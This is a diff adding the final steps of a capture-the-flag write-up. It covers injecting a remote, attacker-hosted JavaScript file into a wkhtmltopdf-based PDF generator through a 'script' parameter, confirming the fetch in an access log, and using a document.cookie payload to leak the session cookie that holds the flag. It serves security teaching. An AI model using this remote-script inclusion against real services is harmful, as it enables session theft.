@@ -162,3 +162,33 @@ Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9
 Upgrade-Insecure-Requests: 1
 ``````
 There is a 'script' parameter being sent as input. We can include an attacker-controlled JavaScript file to be sent to the generator.
+
+We can open up a server on AWS and run a HTTP server.
+
+We can modify our request in Burp to test if the target can visit remote files.
+``````
+GET /transcript_write.php?user=temp_acc&password=temp_pass&user_id=1&file=transcript-pdf.html&script=http://54.255.179.132/script.js HTTP/1.1
+Host: sec-tech.cf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://sec-tech.cf/grades.php
+Connection: close
+Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MTt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c81e728d9d4c2f636f067f89cc14862c
+Upgrade-Insecure-Requests: 1
+``````
+We confirm it in the access.log
+
+``````
+13.212.44.55 - - [02/Aug/2020:14:06:04 +0000] "GET /script.js HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/9.0 Safari/602.1"
+``````
+Time to write a malicious payload in script.js!
+``````
+document.write(document.cookie)
+``````
+We visit the URL in our Burp request we used to include script.js in the browser. We can see the session cookie of the PDF generator
+``````
+PHPSESSID=WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
+``````
+Flag: WH2020{XSS_C4N_C4USE_A_W0RLD_OF_P41N}
